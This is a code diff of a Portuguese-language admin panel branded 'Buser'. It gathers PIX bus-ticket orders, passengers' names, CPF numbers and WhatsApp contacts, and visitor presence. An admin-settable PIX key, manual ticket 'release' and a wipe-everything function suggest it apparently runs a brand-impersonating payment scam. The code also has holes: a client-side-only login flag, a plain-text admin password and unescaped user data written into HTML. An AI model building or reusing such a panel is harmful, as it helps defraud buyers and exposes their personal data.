+function fazerLogout() { sessionStorage.removeItem(STORAGE_KEY); location.reload(); }
+document.getElementById('senha-input')?.addEventListener('keypress', e => { if (e.key === 'Enter') fazerLogin(); });
+
+// NAVEGAÇÃO
+function irParaSecao(secao) {
+  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  document.getElementById('section-' + secao)?.classList.add('active');
+  document.querySelector(`.nav-item[data-section="${secao}"]`)?.classList.add('active');
+  if (window.innerWidth <= 900) document.getElementById('sidebar')?.classList.remove('open');
+}
+function toggleSidebar() { document.getElementById('sidebar')?.classList.toggle('open'); }
+
+async function iniciarPainel() {
+  document.getElementById('login-screen').style.display = 'none';
+  document.getElementById('admin-panel').classList.add('active');
+  carregarPixConfig();
+  ouvirPedidos();
+  ouvirVisitas();
+  inicializarGraficos();
+  
+  if ("Notification" in window && Notification.permission !== "granted") {
+    Notification.requestPermission();
+  }
+}
+
+// PEDIDOS
+function ouvirPedidos() {
+  db.ref('buser_pedidos').on('value', snap => {
+    pedidosCache = [];
+    snap.forEach(clienteSnap => {
+      clienteSnap.forEach(areaSnap => {
+        if (areaSnap.key === 'pix') {
+          areaSnap.forEach(pedidoSnap => {
+            const p = pedidoSnap.val();
+            if (p && p.txid) pedidosCache.push(p);
+          });
+        }
+      });
+    });
+    pedidosCache.sort((a, b) => (b.geradoEm || 0) - (a.geradoEm || 0));
+    
+    atualizarStats();
+    renderizarPedidos();
+    processarClientes();
+    atualizarGraficos();
+    
+    if (!primeiraCarga) { 
+      tocarNotificacao(); 
+      mostrarToast('Novo pedido recebido!', 'success'); 
+      if (Notification.permission === "granted") {
+        new Notification("🚀 Nova Venda Buser!", { body: "Um PIX foi gerado. Verifique o painel." });
+      }
+    }
+    primeiraCarga = false;
+  });
+}
+
+function atualizarStats() {
+  const total = pedidosCache.length;
+  const pagos = pedidosCache.filter(p => p.status === 'paid');
+  const pendentes = pedidosCache.filter(p => p.status === 'pending');
+  const faturamento = pagos.reduce((s, p) => s + (Number(p.amount) || 0), 0);
+
+  document.getElementById('stat-total').textContent = total;
+  document.getElementById('stat-faturamento').textContent = formatarReais(faturamento);
+  document.getElementById('stat-pendentes').textContent = pendentes.length;
+  document.getElementById('nav-badge-pedidos').textContent = total;
+
+  const ticketMedio = pagos.length > 0 ? (faturamento / pagos.length) : 0;
+  document.getElementById('stat-ticket-medio').textContent = formatarReais(ticketMedio);
+  
+  let totalPassageiros = 0;
+  pedidosCache.forEach(p => { totalPassageiros += (p.passengers || []).length; });
+  document.getElementById('stat-passageiros').textContent = totalPassageiros;
+}
+
+function renderizarPedidos() {
+  const busca = document.getElementById('filtro-busca').value.toLowerCase().trim();
+  const status = document.getElementById('filtro-status').value;
+  const dataInicio = document.getElementById('filtro-data-inicio').value;
+  const dataFim = document.getElementById('filtro-data-fim').value;
+
+  let lista = pedidosCache;
+  if (status) lista = lista.filter(p => p.status === status);
+  
+  if (dataInicio) {
+    const inicioMs = new Date(dataInicio + 'T00:00:00').getTime();
+    lista = lista.filter(p => (p.geradoEm || 0) >= inicioMs);
+  }
+  if (dataFim) {
+    const fimMs = new Date(dataFim + 'T23:59:59').getTime();
+    lista = lista.filter(p => (p.geradoEm || 0) <= fimMs);
+  }
+
+  if (busca) {
+    lista = lista.filter(p => {
+      const txt = `${p.txid} ${p.route} ${p.empresa} ${JSON.stringify(p.passengers || [])}`.toLowerCase();
+      return txt.includes(busca);
     });
   }
 
-  function fecharPassagem() { 
-    document.getElementById('modal-passagem').style.display = 'none'; 
-    // Para de ouvir o Firebase quando fecha o voucher
-    if (listenerStatusPedido) {
-      listenerStatusPedido.off();
-      listenerStatusPedido = null;
-    }
+  const tbody = document.getElementById('lista-pedidos');
+  const empty = document.getElementById('empty-pedidos');
+  
+  if (!lista.length) { tbody.innerHTML = ''; empty.style.display = 'block'; return; }
+  empty.style.display = 'none';
+
+  tbody.innerHTML = lista.map(p => {
+    const statusClass = p.status === 'paid' ? 'paid' : p.status === 'cancelled' ? 'cancelled' : 'pending';
+    const statusLabel = p.status === 'paid' ? 'Pago' : p.status === 'cancelled' ? 'Cancelado' : 'Pendente';
+    const data = p.geradoEm ? new Date(p.geradoEm).toLocaleString('pt-BR') : '—';
+    return `
+      <tr>
+        <td><span class="status-badge ${statusClass}">${statusLabel}</span></td>
+        <td><strong style="font-family:monospace">${p.txid}</strong><br><span style="font-size:11px;color:var(--text-muted)">${data}</span></td>
+        <td><strong>${p.route}</strong><br><span style="font-size:11px;color:var(--text-muted)">${p.empresa} • P: ${p.poltrona}</span></td>
+        <td>${(p.passengers || []).length} pessoa(s)</td>
+        <td><strong style="color:var(--brand)">${formatarReais(p.amount)}</strong></td>
+        <td>
+          <button class="btn-action btn-view" onclick="verPedido('${p.txid}')">👁️ Ver</button>
+          ${p.status === 'pending' ? `<button class="btn-action btn-confirm" onclick="confirmarPagamento('${p.txid}')">✅</button>` : ''}
+        </td>
+      </tr>`;
+  }).join('');
+}
+
+async function encontrarReferenciaPedido(txid) {
+  let ref = null;
+  await db.ref('buser_pedidos').once('value', snap => {
+    snap.forEach(cli => { cli.forEach(area => { if (area.key === 'pix') { area.forEach(ped => { if (ped.key === txid) ref = ped.ref; }); } }); });
+  });
+  return ref;
+}
+async function confirmarPagamento(txid) {
+  if (!confirm('Liberar a passagem / Confirmar pagamento do pedido ' + txid + '?')) return;
+  const ref = await encontrarReferenciaPedido(txid);
+  if (ref) { 
+    await ref.update({ status: 'paid', pagoEm: Date.now() }); 
+    mostrarToast('Passagem Liberada com sucesso!', 'success');
+    // Se o modal estiver aberto, recarrega ele
+    if(document.getElementById('modal-pedido').classList.contains('active')) verPedido(txid);
+  }
+}
+
+function verPedido(txid) {
+  const p = pedidosCache.find(x => x.txid === txid);
+  if (!p) return;
+  const statusClass = p.status === 'paid' ? 'paid' : p.status === 'cancelled' ? 'cancelled' : 'pending';
+  const statusLabel = p.status === 'paid' ? 'Pago' : p.status === 'cancelled' ? 'Cancelado' : 'Pendente';
+  
+  const passageirosHtml = (p.passengers || []).map(x => {
+    let zapLink = x.whatsapp ? x.whatsapp.replace(/\D/g, '') : '';
+    if (zapLink && !zapLink.startsWith('55')) zapLink = '55' + zapLink;
+    const zapBtn = zapLink ? `<a href="https://wa.me/${zapLink}" target="_blank" class="btn-action btn-confirm" style="text-decoration:none;margin-top:6px;display:inline-flex">💬 Chamar no Zap</a>` : '';
+
+    return `<div style="background:var(--hover-bg);padding:12px;border-radius:8px;margin-bottom:8px">
+      <strong style="display:block;font-size:14px">${x.nome}</strong>
+      <span style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:6px">CPF: ${x.cpf} • Poltrona: ${x.poltrona}</span>
+      ${zapBtn}
+    </div>`;
+  }).join('');
+
+  // Adiciona o botão verde de liberar passagem se estiver pendente
+  let btnLiberar = '';
+  if (p.status === 'pending') {
+    btnLiberar = `<button class="btn-primary" style="background:var(--green); box-shadow:none; flex:1;" onclick="confirmarPagamento('${p.txid}')">✅ Liberar Passagem</button>`;
   }
 
-  function mascaraCPF(v) { v = v.replace(/\D/g, '').substring(0, 11); return v.replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d{1,2})$/, '$1-$2'); }
-  function mascaraWhats(v) { v = v.replace(/\D/g, '').substring(0, 11); return v.replace(/^(\d{2})(\d{5})(\d{0,4}).*/, '($1) $2-$3'); }
-  function mascaraData(v) { v = v.replace(/\D/g, '').substring(0, 8); return v.replace(/(\d{2})(\d)/, '$1/$2').replace(/(\d{2})(\d)/, '$1/$2'); }
+  document.getElementById('modal-pedido-body').innerHTML = `
+    <div class="detail-row"><span>Status</span><strong><span class="status-badge ${statusClass}">${statusLabel}</span></strong></div>
+    <div class="detail-row"><span>Rota</span><strong>${p.route}</strong></div>
+    <div class="detail-row"><span>Empresa</span><strong>${p.empresa}</strong></div>
+    <div class="detail-row"><span>Valor</span><strong style="color:var(--brand)">${formatarReais(p.amount)}</strong></div>
+    <div style="margin-top:20px">
+      <div style="font-size:12px;font-weight:600;color:var(--text-muted);text-transform:uppercase;margin-bottom:10px">Passageiros</div>
+      ${passageirosHtml}
+    </div>
+    <div style="margin-top:24px; display:flex; gap:12px; border-top: 1px solid var(--border-color); padding-top: 16px;" class="no-print">
+      ${btnLiberar}
+      <button class="btn-primary" onclick="window.print()" style="padding:10px 20px;font-size:13px; flex:1;">🖨️ Imprimir Voucher</button>
+    </div>
+  `;
+  document.getElementById('modal-pedido').classList.add('active');
+}
+function fecharModalPedido() { document.getElementById('modal-pedido').classList.remove('active'); }
 
-  // ============================================================
-  // WHATSAPP - BOTÃO FLUTUANTE
-  // ============================================================
-  function abrirWhatsApp() {
-    const numero = '5511918764664'; // 11 91876-4664 com DDI 55
-    const mensagem = encodeURIComponent('Olá! Vim pelo site da Buser e gostaria de mais informações sobre as passagens.');
-    const url = `https://wa.me/${numero}?text=${mensagem}`;
-    window.open(url, '_blank', 'noopener,noreferrer');
+// LIMPAR HISTÓRICO DE VISITAS
+async function limparHistoricoVisitas() {
+  if (!confirm('⚠️ Tem certeza que deseja apagar TODO o histórico de visitantes?\n\nQuem estiver no site agora vai aparecer novamente em alguns segundos.')) return;
+  try {
+    await db.ref('buser_visitas').remove();
+    mostrarToast('Histórico de visitas limpo!', 'success');
+  } catch(e) {
+    mostrarToast('Erro ao limpar histórico', 'error');
   }
+}
+
+// LIMPAR TUDO (PEDIDOS + VISITAS)
+async function limparTUDO() {
+  const primeiraConfirmacao = confirm('🚨 ATENÇÃO: Você está prestes a apagar TODOS os pedidos e TODAS as visitas.\n\nIsso vai zerar o seu faturamento e o caixa. Deseja continuar?');
+  if (!primeiraConfirmacao) return;
+
+  const segundaConfirmacao = prompt('Para confirmar a exclusão DEFINITIVA de tudo, digite a palavra: APAGAR');
+  if (segundaConfirmacao !== 'APAGAR') {
+    alert('Exclusão cancelada. Nada foi apagado.');
+    return;
+  }
+
+  try {
+    // Apaga Pedidos
+    await db.ref('buser_pedidos').remove();
+    // Apaga Visitas
+    await db.ref('buser_visitas').remove();
+    
+    mostrarToast('TODOS os dados foram apagados com sucesso!', 'success');
+  } catch(e) {
+    console.error(e);
+    mostrarToast('Erro ao tentar apagar os dados', 'error');
+  }
+}
+
+// CLIENTES (CRM)
+function processarClientes() {
+  const clientesMap = {};
+  pedidosCache.forEach(p => {
+    if (p.status === 'cancelled') return;
+    (p.passengers || []).forEach(pass => {
+      const cpf = pass.cpf || 'Sem CPF';
+      if (!clientesMap[cpf]) {
+        clientesMap[cpf] = { nome: pass.nome, cpf: cpf, whatsapp: pass.whatsapp || '', totalCompras: 0, ultimaCompra: 0 };
+      }
+      clientesMap[cpf].totalCompras += Number(p.amount) / (p.passengers.length || 1);
+      if ((p.geradoEm || 0) > clientesMap[cpf].ultimaCompra) clientesMap[cpf].ultimaCompra = p.geradoEm;
+    });
+  });
+  
+  window.clientesCache = Object.values(clientesMap).sort((a,b) => b.ultimaCompra - a.ultimaCompra);
+  renderizarClientes();
+}
+
+function renderizarClientes() {
+  const busca = document.getElementById('filtro-busca-cliente').value.toLowerCase();
+  let lista = window.clientesCache || [];
+  if (busca) lista = lista.filter(c => c.nome.toLowerCase().includes(busca) || c.cpf.includes(busca));
+
+  const tbody = document.getElementById('lista-clientes');
+  const empty = document.getElementById('empty-clientes');
+  if (!lista.length) { tbody.innerHTML = ''; empty.style.display = 'block'; return; }
+  empty.style.display = 'none';
+
+  tbody.innerHTML = lista.map(c => {
+    let zapLink = c.whatsapp ? c.whatsapp.replace(/\D/g, '') : '';
+    if (zapLink && !zapLink.startsWith('55')) zapLink = '55' + zapLink;
+    const zapBtn = zapLink ? `<a href="https://wa.me/${zapLink}" target="_blank" class="btn-action btn-confirm" style="text-decoration:none">💬 Zap</a>` : '—';
+
+    return `
+      <tr>
+        <td><strong>${c.nome}</strong></td>
+        <td style="font-family:monospace">${c.cpf}</td>
+        <td>${c.whatsapp || '—'}</td>
+        <td style="font-weight:700;color:var(--brand)">${formatarReais(c.totalCompras)}</td>
+        <td style="font-size:12px;color:var(--text-muted)">${new Date(c.ultimaCompra).toLocaleDateString('pt-BR')}</td>
+        <td>${zapBtn}</td>
+      </tr>
+    `;
+  }).join('');
+}
+
+// VISITAS
+function ouvirVisitas() {
+  db.ref('buser_visitas').on('value', snap => {
+    visitasCache = [];
+    snap.forEach(child => {
+      const v = child.val() || {};
+      if (!v.ultimaAtividade) return; 
+      
+      visitasCache.push({ 
+        id: child.key, 
+        online: !!v.online, 
+        ultimaAtividade: v.ultimaAtividade, 
+        primeiraVisita: v.primeiraVisita || v.ultimaAtividade 
+      });
+    });
+    
+    const agora = Date.now();
+    const LIMITE = 1 * 60 * 1000; // 1 minuto
+    const online = visitasCache.filter(v => (agora - v.ultimaAtividade) < LIMITE).length;
+    
+    document.getElementById('stat-online').textContent = online;
+    document.getElementById('stat-visitas-online').textContent = online;
+    document.getElementById('stat-visitas-total').textContent = visitasCache.length;
+    document.getElementById('nav-badge-visitas').textContent = visitasCache.length;
+
+    const hojeInicio = new Date().setHours(0,0,0,0);
+    const novosHoje = visitasCache.filter(v => v.primeiraVisita >= hojeInicio).length;
+    document.getElementById('stat-visitas-hoje').textContent = novosHoje;
+
+    renderizarVisitas();
+  });
+}
+
+function renderizarVisitas() {
+  const agora = Date.now();
+  const LIMITE = 1 * 60 * 1000; // 1 minuto
+  const ordenadas = [...visitasCache].sort((a, b) => b.ultimaAtividade - a.ultimaAtividade);
+  const tbody = document.getElementById('lista-visitas');
+  
+  if (!ordenadas.length) { tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;padding:20px;color:var(--text-muted)">Nenhum visitante registrado.</td></tr>'; return; }
+
+  tbody.innerHTML = ordenadas.map(v => {
+    const isOnline = agora - v.ultimaAtividade < LIMITE;
+    return `
+      <tr>
+        <td><div style="display:flex;align-items:center;gap:6px"><span class="v-dot ${isOnline ? 'online' : ''}"></span> <span style="font-size:11px;font-weight:600;color:${isOnline?'var(--green-dark)':'var(--text-muted)'}">${isOnline?'ONLINE':'Offline'}</span></div></td>
+        <td style="font-family:monospace;font-size:12px">${v.id}</td>
+        <td style="font-size:12px">${new Date(v.primeiraVisita).toLocaleString('pt-BR')}</td>
+        <td style="font-size:12px">${new Date(v.ultimaAtividade).toLocaleString('pt-BR')}</td>
+      </tr>`;
+  }).join('');
+}
+
+// GRÁFICOS
+let chartLinha, chartPizza;
+function inicializarGraficos() {
+  const ctx = document.getElementById('graficoVendas').getContext('2d');
+  chartLinha = new Chart(ctx, {
+    type: 'line',
+    data: { labels: [], datasets: [{ label: 'Faturamento (R$)', data: [], borderColor: '#f11075', backgroundColor: 'rgba(241,16,117,0.1)', tension: 0.4, fill: true }] },
+    options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { display: false } }, scales: { y: { beginAtZero: true, grid: { color: document.body.classList.contains('dark-mode') ? '#333' : '#f0f0f0' }, ticks:{color: getComputedStyle(document.body).getPropertyValue('--text-muted')} }, x: { grid: { display: false }, ticks:{color: getComputedStyle(document.body).getPropertyValue('--text-muted')} } } }
+  });
+
+  const ctxPie = document.getElementById('graficoPizza').getContext('2d');
+  chartPizza = new Chart(ctxPie, {
+    type: 'doughnut',
+    data: { labels: ['Pagos', 'Pendentes', 'Cancelados'], datasets: [{ data: [0,0,0], backgroundColor: ['#40b552', '#f0a500', '#d81b60'], borderWidth: 0 }] },
+    options: { responsive: true, maintainAspectRatio: false, cutout: '70%', plugins: { legend: { position: 'bottom', labels: { color: getComputedStyle(document.body).getPropertyValue('--text-main') } } } }
+  });
+}
+
+function atualizarGraficos() {
+  if (!chartLinha || !chartPizza) return;
+
+  const labels = [], data = [];
+  const pagos = pedidosCache.filter(p => p.status === 'paid' && p.geradoEm);
+  for (let i = 6; i >= 0; i--) {
+    const d = new Date(); d.setDate(d.getDate() - i);
+    labels.push(d.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit' }));
+    const inicio = new Date(d.getFullYear(), d.getMonth(), d.getDate()).getTime();
+    const fim = inicio + 86400000;
+    data.push(pagos.filter(p => p.geradoEm >= inicio && p.geradoEm < fim).reduce((s, p) => s + (Number(p.amount) || 0), 0));
+  }
+  chartLinha.data.labels = labels;
+  chartLinha.data.datasets[0].data = data;
+  chartLinha.update();
+
+  const qtPagos = pedidosCache.filter(p => p.status === 'paid').length;
+  const qtPend = pedidosCache.filter(p => p.status === 'pending').length;
+  const qtCanc = pedidosCache.filter(p => p.status === 'cancelled').length;
+  chartPizza.data.datasets[0].data = [qtPagos, qtPend, qtCanc];
+  chartPizza.update();
+
+  const rotas = {};
+  pedidosCache.filter(p => p.status === 'paid').forEach(p => {
+    rotas[p.route] = (rotas[p.route] || 0) + 1;
+  });
+  const topRotas = Object.entries(rotas).sort((a,b) => b[1] - a[1]).slice(0, 5);
+  const tbody = document.getElementById('lista-top-rotas');
+  if (topRotas.length) {
+    tbody.innerHTML = topRotas.map(r => `<tr><td><strong>${r[0]}</strong></td><td><span style="background:var(--brand-soft);color:var(--brand);padding:2px 8px;border-radius:20px;font-weight:700">${r[1]} vendas</span></td></tr>`).join('');
+  } else {
+    tbody.innerHTML = '<tr><td colspan="2" style="text-align:center;color:var(--text-muted)">Nenhuma venda paga ainda.</td></tr>';
+  }
+}
+
+// PIX CONFIG
+async function carregarPixConfig() {
+  try {
+    const snap = await db.ref('buser_pix_cfg').once('value');
+    const cfg = snap.val() || {};
+    document.getElementById('pix-key').value = cfg.key || '';
+    document.getElementById('pix-name').value = cfg.name || '';
+    document.getElementById('pix-city').value = cfg.city || '';
+  } catch(e) {}
+}
+async function salvarPixConfig() {
+  const key = document.getElementById('pix-key').value.trim();
+  const name = document.getElementById('pix-name').value.trim().toUpperCase();
+  const city = document.getElementById('pix-city').value.trim().toUpperCase();
+  if (!key) { mostrarToast('Chave PIX é obrigatória', 'error'); return; }
+  await db.ref('buser_pix_cfg').set({ key, name: name || 'BUSER', city: city || 'SAO PAULO' });
+  mostrarToast('Configuração salva!', 'success');
+}
+function testarPix() {
+  const key = document.getElementById('pix-key').value.trim().replace(/\s+/g, '');
+  if (!key) { mostrarToast('Preencha a chave', 'error'); return; }
+  const payload = "00020126580014br.gov.bcb.pix0136" + key + "5204000053039865802BR5905BUSER6008SAOPAULO62070503***6304ABCD";
+  document.getElementById('pix-qr').innerHTML = '';
+  new QRCode(document.getElementById('pix-qr'), { text: payload, width: 160, height: 160 });
+  document.getElementById('pix-preview').style.display = 'flex';
+}
+
+// UTILS E SOM
+function formatarReais(v) { return 'R$ ' + Number(v || 0).toFixed(2).replace('.', ',').replace(/\B(?=(\d{3})+(?!\d))/g, '.'); }
+function mostrarToast(msg, tipo = 'info') {
+  const t = document.createElement('div'); t.className = 'toast ' + tipo;
+  t.innerHTML = `<strong>${tipo === 'success' ? '✅' : '❌'} ${msg}</strong>`;
+  document.getElementById('toast-container').appendChild(t);
+  setTimeout(() => { t.style.opacity = '0'; setTimeout(() => t.remove(), 300); }, 3500);
+}
+
+function tocarNotificacao() {
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const osc = ctx.createOscillator();
+    const gain = osc.connect(ctx.destination);
+    osc.type = 'sine';
+    osc.frequency.setValueAtTime(880, ctx.currentTime); 
+    osc.frequency.exponentialRampToValueAtTime(440, ctx.currentTime + 0.1);
+    gain.gain.setValueAtTime(0.3, ctx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.5);
+    osc.start();
+    osc.stop(ctx.currentTime + 0.5);
+  } catch(e) { console.log('Navegador bloqueou o áudio'); }
+}
+
+function exportarCSV() {
+  if (!pedidosCache.length) { mostrarToast('Sem pedidos', 'error'); return; }
+  const rows = pedidosCache.map(p => [p.txid, p.status, p.route, p.empresa, p.amount, new Date(p.geradoEm).toLocaleString('pt-BR')]);
+  const csv = [['TXID','Status','Rota','Empresa','Valor','Data'], ...rows].map(r => r.join(',')).join('\n');
+  const a = document.createElement('a'); a.href = URL.createObjectURL(new Blob(['\ufeff' + csv], { type: 'text/csv;charset=utf-8;' })); a.download = `pedidos-buser.csv`; a.click();
+}
+
+async function alterarSenha() {
+  const s1 = document.getElementById('nova-senha').value;
+  const s2 = document.getElementById('confirma-senha').value;
+  if (s1.length < 6) { mostrarToast('Mínimo 6 caracteres', 'error'); return; }
+  if (s1 !== s2) { mostrarToast('Senhas não coincidem', 'error'); return; }
+  await db.ref('buser_admin_cfg/password').set(s1);
+  mostrarToast('Senha alterada!', 'success');
+  document.getElementById('nova-senha').value = ''; document.getElementById('confirma-senha').value = '';
+}
+
+if (sessionStorage.getItem(STORAGE_KEY) === '1') iniciarPainel();
+setInterval(() => { if (document.getElementById('admin-panel').classList.contains('active')) renderizarVisitas(); }, 15000);
 </script>
-
 </body>
 </html>
